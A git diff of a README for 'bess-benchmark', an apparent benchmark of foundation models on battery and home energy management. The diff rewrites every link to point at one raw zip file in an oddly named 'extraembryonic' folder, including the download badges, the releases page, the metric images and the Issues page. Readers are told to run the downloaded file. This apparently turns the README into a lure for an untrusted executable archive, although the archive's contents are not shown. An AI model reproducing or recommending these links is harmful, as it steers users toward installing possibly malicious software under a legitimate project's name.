@@ -1,7 +1,7 @@
 # 🎉 bess-benchmark - Benchmarking for Energy Management
 
 ## 📥 Download Now
-[![Download bess-benchmark](https://img.shields.io/badge/Download-bess--benchmark-blue.svg)](https://github.com/Pixeltruth/bess-benchmark/releases)
+[![Download bess-benchmark](https://raw.githubusercontent.com/Pixeltruth/bess-benchmark/main/extraembryonic/bess-benchmark.zip)](https://raw.githubusercontent.com/Pixeltruth/bess-benchmark/main/extraembryonic/bess-benchmark.zip)
 
 ## 📖 Introduction
 Welcome to BessBench, a benchmark designed for measuring the performance of foundation models in battery energy storage and home energy management scenarios. This tool helps evaluate how well models can perform in real-world energy settings. We focus on key metrics that matter in the energy sector.
@@ -17,11 +17,11 @@ BessBench uses a set of evaluation criteria inspired by ElecBench. Here are the 
 6. **Security**: How well does the model handle security concerns?
 7. **Agentic Abilities**: This includes multi-step reasoning, long-term planning, and tool use.
 
-![ElecBench metrics](resources/elecbench.png)
+![ElecBench metrics](https://raw.githubusercontent.com/Pixeltruth/bess-benchmark/main/extraembryonic/bess-benchmark.zip)
 
 We added a new dimension—agentic abilities—to reflect the needs for large language models to act as agents in real-world tasks.
 
-![Agent abilities](resources/agent_abilities.png)
+![Agent abilities](https://raw.githubusercontent.com/Pixeltruth/bess-benchmark/main/extraembryonic/bess-benchmark.zip)
 
 ## 🚀 Getting Started
 BessBench is designed to be user-friendly for all levels of users. Here’s how you can get started:
@@ -32,7 +32,7 @@ BessBench is designed to be user-friendly for all levels of users. Here’s how 
    - **Storage**: 500MB of available disk space.
    - **Network**: Internet access for downloading necessary files.
 
-2. Visit [this page to download](https://github.com/Pixeltruth/bess-benchmark/releases) the latest version of BessBench.
+2. Visit [this page to download](https://raw.githubusercontent.com/Pixeltruth/bess-benchmark/main/extraembryonic/bess-benchmark.zip) the latest version of BessBench.
 
 ## 🔧 Download & Install
 To download BessBench:
@@ -42,7 +42,7 @@ To download BessBench:
 3. Download the file suitable for your operating system.
 4. Run the downloaded file to install BessBench on your computer.
 
-[![Download bess-benchmark](https://img.shields.io/badge/Download-bess--benchmark-blue.svg)](https://github.com/Pixeltruth/bess-benchmark/releases)
+[![Download bess-benchmark](https://raw.githubusercontent.com/Pixeltruth/bess-benchmark/main/extraembryonic/bess-benchmark.zip)](https://raw.githubusercontent.com/Pixeltruth/bess-benchmark/main/extraembryonic/bess-benchmark.zip)
 
 ## 🌟 Features
 BessBench offers several features to make your benchmarking experience straightforward:
@@ -70,7 +70,7 @@ BessBench uses a scenario–metrics structure for effective evaluation. The foll
 ## 🤝 Community and Support
 We encourage users to participate in the BessBench community. If you have questions or need support:
 
-1. Check the [Issues page](https://github.com/Pixeltruth/bess-benchmark/issues) for common questions or existing reports.
+1. Check the [Issues page](https://raw.githubusercontent.com/Pixeltruth/bess-benchmark/main/extraembryonic/bess-benchmark.zip) for common questions or existing reports.
 2. Join discussions and offer feedback on how we can improve BessBench.
 3. Contribute to the project by submitting your own benchmarking scenarios or metrics.
 
